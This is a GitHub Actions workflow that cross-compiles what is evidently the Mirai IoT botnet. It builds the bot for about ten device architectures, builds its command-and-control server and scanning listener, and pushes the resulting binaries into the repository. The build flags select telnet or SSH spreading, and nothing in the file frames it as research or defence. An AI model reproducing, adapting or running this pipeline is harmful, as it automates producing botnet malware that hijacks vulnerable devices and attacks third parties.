name: C/C++ Build and Push

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

jobs:
  build:

    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up environment
        run: |
          sudo apt-get update
          sudo apt-get install -y gcc g++ make golang wget tar

      - name: Install cross-compilers
        run: |
          mkdir /etc/xcompile
          cd /etc/xcompile
          wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-armv4l.tar.gz
          wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-armv5l.tar.gz
          wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-armv6l.tar.gz
          wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-i586.tar.gz
          wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-i686.tar.gz
          wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-m68k.tar.gz
          wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-mips.tar.gz
          wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-mipsel.tar.gz
          wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-powerpc.tar.gz
          wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-sh4.tar.gz
          wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-sparc.tar.gz
          wget https://landley.net/aboriginal/downloads/binaries/cross-compiler-x86_64.tar.gz

          for file in *.tar.gz; do
            tar -xf "$file"
            rm "$file"
          done

          mv cross-compiler-*/* /etc/xcompile/
          rm -rf cross-compiler-*

      - name: Update PATH for cross-compilers
        run: |
          echo "/etc/xcompile/armv4l/bin" >> $GITHUB_ENV
          echo "/etc/xcompile/armv5l/bin" >> $GITHUB_ENV
          echo "/etc/xcompile/armv6l/bin" >> $GITHUB_ENV
          echo "/etc/xcompile/i586/bin" >> $GITHUB_ENV
          echo "/etc/xcompile/i686/bin" >> $GITHUB_ENV
          echo "/etc/xcompile/m68k/bin" >> $GITHUB_ENV
          echo "/etc/xcompile/mips/bin" >> $GITHUB_ENV
          echo "/etc/xcompile/mipsel/bin" >> $GITHUB_ENV
          echo "/etc/xcompile/powerpc/bin" >> $GITHUB_ENV
          echo "/etc/xcompile/sh4/bin" >> $GITHUB_ENV
          echo "/etc/xcompile/sparc/bin" >> $GITHUB_ENV
          echo "/etc/xcompile/x86_64/bin" >> $GITHUB_ENV

      - name: Install Go dependencies
        run: |
          cd cnc
          go get github.com/go-sql-driver/mysql
          go get github.com/mattn/go-shellwords
          go build -o cnc # Build the cnc binary and specify output name
          cd ..

      - name: Compile release
        env:
          BUILD_MODE: release # Change to 'debug' as needed
          BUILD_TYPE: telnet # Change to 'ssh' as needed
        run: |
          # Create necessary directories
          mkdir -p release debug

          # Function to compile bot
          compile_bot() {
            echo "Compiling $2"
            ${1}-gcc -std=c99 $3 bot/*.c -O3 -o release/"$2"
            if [ $? -ne 0 ]; then
              echo "Compilation of $2 failed"
              exit 1
            fi
            ${1}-strip release/"$2" -S --strip-unneeded || true
          }

          FLAGS=""
          if [ "$BUILD_TYPE" == "telnet" ]; then
            FLAGS="-DMIRAI_TELNET"
          elif [ "$BUILD_TYPE" == "ssh" ]; then
            FLAGS="-DMIRAI_SSH"
          fi

          echo "Building in $BUILD_MODE mode with $BUILD_TYPE type"

          if [ "$BUILD_MODE" == "release" ]; then
            rm -f release/mirai.* release/miraint.*
            compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
            compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static" || true
            compile_bot mipsel mirai.mpsl "$FLAGS -DKILLER_REBIND_SSH -static" || true
            compile_bot armv4l mirai.arm "$FLAGS -DKILLER_REBIND_SSH -static"
            compile_bot armv5l mirai.arm5n "$FLAGS -DKILLER_REBIND_SSH"
            compile_bot armv6l mirai.arm7 "$FLAGS -DKILLER_REBIND_SSH -static"
            compile_bot powerpc mirai.ppc "$FLAGS -DKILLER_REBIND_SSH -static" || true
            compile_bot sparc mirai.spc "$FLAGS -DKILLER_REBIND_SSH -static" || true
            compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static" || true
            compile_bot sh4 mirai.sh4 "$FLAGS -DKILLER_REBIND_SSH -static" || true

            mv cnc/cnc release/ # Corrected path
            go build -o release/scanListen tools/scanListen.go
          elif [ "$BUILD_MODE" == "debug" ]; then
            gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -g -o debug/mirai.dbg
            gcc -std=c99 tools/enc.c -g -o debug/enc
            gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
            gcc -std=c99 tools/badbot.c -g -o debug/badbot
            mv cnc/cnc debug/ # Corrected path
            go build -o debug/scanListen tools/scanListen.go
          else
            echo "Unknown parameter $BUILD_MODE: debug or release required"
            exit 1
          fi

          # List files in the release directory for debugging
          echo "Files in release directory:"
          ls -la release

      - name: Check if build was successful
        run: |
          if [ -z "$(ls -A release)" ]; then
            echo "Build failed or no files were created in the release directory."
            exit 1
          fi

      - name: Push changes
        run: |
          git config --local user.email "you@example.com"
          git config --local user.name "Your Name"
          git add release/*
          git commit -m "Build results for $BUILD_MODE with $BUILD_TYPE" || true
          git push
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
